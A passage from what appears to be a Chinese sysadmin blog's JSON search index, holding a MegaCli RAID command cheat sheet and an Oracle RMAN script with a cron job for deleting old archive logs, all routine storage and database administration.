\u0026#39;Firmware state\u0026#39; #/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv [32:3] -force -a0 #/opt/MegaRAID/MegaCli/MegaCli64 AdpGetProp EnableJBOD -aALL #/opt/MegaRAID/MegaCli/MegaCli64 -AdpSetProp -EnableJBOD -1 -a0 #/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeJBOD -PhysDrv[252:0] -a0 # create Raid0 #/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r0[252:3] -a0 # Get old Cache, ex: Virtual Drive(Target ID 02) #/opt/MegaRAID/MegaCli/MegaCli64 -GetPreservedCacheList -a0 # Clear cache, ex: Virtual Drive(Target ID 02) #/opt/MegaRAID/MegaCli/MegaCli64 -DiscardPreservedCache -L2 -a0 # create Raid1 #/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r1[252:4,252:5] -a0 # create Raid5 #/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r5[252:2,252:3,252:4,252:5] -a0 # create Raid10 #/opt/MegaRAID/MegaCli/MegaCli64 -CfgSpanAdd -r10 -Array0[32:4,32:5] -Array1[32:6,32:7] -a0 #delete raid #/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdDel -L0 -a0 #Virtual Drive: 0 (Target Id: 0) # check Raid #/opt/MegaRAID/MegaCli/MegaCli64 -LDInfo -Lall -aALL #RAID 1 #RAID Level : Primary-1, Secondary-0, RAID Level Qualifier-0 #RAID 5 #RAID Level : Primary-5, Secondary-0, RAID Level Qualifier-3 # check Raid disks #/opt/MegaRAID/MegaCli/MegaCli64 -LdPdInfo -aAll | egrep \u0026#34;^Adapter|^Number of Virtual|^Virtual Drive:|^Name|^Enclosure Device ID:|^Slot Number:\u0026#34; # GPT part #parted -s /dev/sde mklabel gpt mkpart primary 0% 100% # check disk rebuild progress #/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -ShowProg -physdrv[32:1] -aALL #Rebuild Progress on Device at Enclosure 32, Slot 1 Completed 7% in 3 Minutes. # Force rebuild #/opt/MegaRAID/MegaCli/MegaCli64 -PDRbld -Start -physdrv[32:1] -a0 # OR #/opt/MegaRAID/MegaCli/MegaCli64 -pdlocate -start -physdrv[32:1] -a0 #Start rebuild, first clean the foreign configuration and then make the device hot spare (only if the above command failed) #/opt/MegaRAID/MegaCli/MegaCli64 -CfgForeign -Clear -aALL #set global hostspare #/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Set -PhysDrv [32:1] -a0 #If you need to unset/remove a global hotspare: #/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Rmv -PhysDrv [32:1] -aN #downgrade raid6 --\u0026gt; raid5 ,and more space now can be used # -L0 virtual disk 0 # /opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -L0 -a0 # echo 1 \u0026gt; /sys/block/sda/device/rescan #Add disk to a raid5 #/opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -Add -PhysDrv[32:3] -L0 -a #Configure WriteThrough or WriteBack #/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WT -Immediate -Lall -aAll #/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WB -Immediate -Lall -aAll #/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL |grep \u0026#34;Inquiry Data:\u0026#34; #Inquiry Data: SEAGATE ST600MP0005 VS08S7M04B0C #Inquiry Data: SEAGATE ST600MP0005 VS08S7M04AFD #Inquiry Data: SEAGATE ST600MP0005 VS08S7M04JAY #Inquiry Data: SEAGATE ST600MP0005 VS08S7M04AAG #/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL | grep \u0026#34;Drive Temperature\u0026#34; #Drive Temperature :36C (96.80 F) #Drive Temperature :35C (95.00 F) ","permalink":"https://rendoumi.com/posts/20221217-megacli/","summary":"\u003cp\u003e这Megacli是操作磁盘Raid的常用软件，日常用的大多是dell家的机器，都是这软件，记录一下。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -A1 \u003cspan class=\"s2\"\u003e\u0026#34;Enclosure Device\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# clear foreign disk \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -scan -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -cfgforeign -clear -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# clear Firmware state\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep \u0026#39;Firmware state\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv \u0026#34;[32:3]\u0026#34; -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# clear Firmware JBOD mode, first turn into unconfig mode, then MakeGood\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -a0 |grep \u0026#39;Firmware state\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeGood -Physdrv [32:3] -force -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 AdpGetProp EnableJBOD -aALL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -AdpSetProp -EnableJBOD -1  -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDMakeJBOD -PhysDrv[252:0] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# create Raid0 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r0[252:3] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Get old Cache, ex: Virtual Drive(Target ID 02)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -GetPreservedCacheList -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Clear cache, ex: Virtual Drive(Target ID 02)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -DiscardPreservedCache -L2 -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# create Raid1 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r1[252:4,252:5] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# create Raid5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdAdd -r5[252:2,252:3,252:4,252:5] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# create Raid10\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgSpanAdd -r10 -Array0[32:4,32:5] -Array1[32:6,32:7] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#delete raid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgLdDel -L0 -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Virtual Drive: 0 (Target Id: 0)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# check Raid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -LDInfo -Lall -aALL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#RAID 1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#RAID Level          : Primary-1, Secondary-0, RAID Level Qualifier-0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#RAID 5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#RAID Level          : Primary-5, Secondary-0, RAID Level Qualifier-3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# check Raid disks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -LdPdInfo -aAll | egrep \u0026#34;^Adapter|^Number of Virtual|^Virtual Drive:|^Name|^Enclosure Device ID:|^Slot Number:\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# GPT part\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#parted -s /dev/sde mklabel gpt mkpart primary 0% 100%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# check disk rebuild progress\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64  -PDRbld -ShowProg -physdrv[32:1] -aALL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Rebuild Progress on Device at Enclosure 32, Slot 1 Completed 7% in 3 Minutes.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Force rebuild\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64  -PDRbld -Start -physdrv[32:1] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# OR\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64  -pdlocate -start -physdrv[32:1] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Start rebuild, first clean the foreign configuration and then make the device hot spare (only if the above command failed)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -CfgForeign -Clear -aALL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#set global hostspare\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Set -PhysDrv [32:1] -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#If you need to unset/remove a global hotspare:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDHSP -Rmv -PhysDrv [32:1] -aN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#downgrade raid6 --\u0026gt; raid5 ,and more space now can be used\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# -L0  virtual disk 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# /opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -L0 -a0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# echo 1 \u0026gt; /sys/block/sda/device/rescan\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Add disk to a raid5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -LDRecon -Start -r5 -Add -PhysDrv[32:3] -L0 -a\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Configure WriteThrough or WriteBack\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WT -Immediate -Lall -aAll\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -LDSetProp -WB -Immediate -Lall -aAll\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL |grep \u0026#34;Inquiry Data:\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04B0C            \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04AFD            \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04JAY            \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Inquiry Data: SEAGATE ST600MP0005     VS08S7M04AAG            \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#/opt/MegaRAID/MegaCli/MegaCli64 -PDList -aALL  | grep \u0026#34;Drive Temperature\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Drive Temperature :36C (96.80 F)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Drive Temperature :35C (95.00 F)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Megacli操作磁盘的常用命令"},{"content":"这一篇正规的DBA看到肯定会呲之以鼻，但对于没有用过oracle的系统运维来说，就是必须知道的事情了。\n公司的 Oracle 实例有两台数据库，定时用rman备份，但是没有自动清理机制 ，过一阵子磁盘就会超过 80% 告警，需要手动清理，烦不胜烦。\n凡是要手动做三次的事情必须自动化处理，启荣大师如是说，照办就是。\ncat del_log.sh #!/bin/bash source /home/oracle/.bash_profile rman target / \u0026lt;\u0026lt; EOF delete noprompt archivelog until time \u0026#39;sysdate-7\u0026#39;; exit; EOF 很简单吧。上面引用的 .bash_profile 内容如下：\n# .bash_profile # Get the aliases and functions if [ -f ~/.bashrc ]; then . ~/.bashrc fi # User specific environment and startup programs PATH=$PATH:$HOME/.local/bin:$HOME/bin export PATH export ORACLE_BASE=/data/u01/app/oracle export ORACLE_HOME=/data/u01/app/oracle/product/18.3.0/dbhome_1 export ORACLE_SID=oradb export PATH=/usr/sbin:$PATH export PATH=$ORACLE_HOME/bin:$PATH:/usr/local/bin export LD_LIBRARY_PATH=$ORACLE_HOME/lib:/lib:/usr/lib:$ORACLE_HOME/rdbms/lib export CLASSPATH=$ORACLE_HOME/JRE:$ORACLE_HOME/jlib:$ORACLE_HOME/rdbms/jlib export NLS_DATE_FORMAT=\u0026#39;yyyy/mm/dd hh24:mi:ss\u0026#39; export EDITOR=vi umask 022 这个 del_log.sh 的脚本放进 oracle 用户的 crontab 里执行就好\n0 3 * * * /usr/local/bin/del_log.sh ","permalink":"https://rendoumi.com/posts/20221208-oracle_rman/","summary":"\u003cp\u003e这一篇正规的DBA看到肯定会呲之以鼻，但对于没有用过oracle的系统运维来说，就是必须知道的事情了。\u003c/p\u003e\n\u003cp\u003e公司的 Oracle 实例有两台数据库，定时用rman备份，但是没有自动清理机制 ，过一阵子磁盘就会超过 80% 告警，需要手动清理，烦不胜烦。\u003c/p\u003e\n\u003cp\u003e凡是要手动做三次的事情必须自动化处理，启荣大师如是说，照办就是。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat del_log.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003esource\u003c/span\u003e /home/oracle/.bash_profile\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erman target / \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003edelete noprompt archivelog until time \u0026#39;sysdate-7\u0026#39;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eexit;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e很简单吧。上面引用的 .bash_profile 内容如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# .bash_profile\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Get the aliases and functions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -f ~/.bashrc \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        . ~/.bashrc\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# User specific environment and startup programs\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e:\u003cspan class=\"nv\"\u003e$HOME\u003c/span\u003e/.local/bin:\u003cspan class=\"nv\"\u003e$HOME\u003c/span\u003e/bin\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e PATH\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eORACLE_BASE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/data/u01/app/oracle\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eORACLE_HOME\u003c/span\u003e\u003cspan 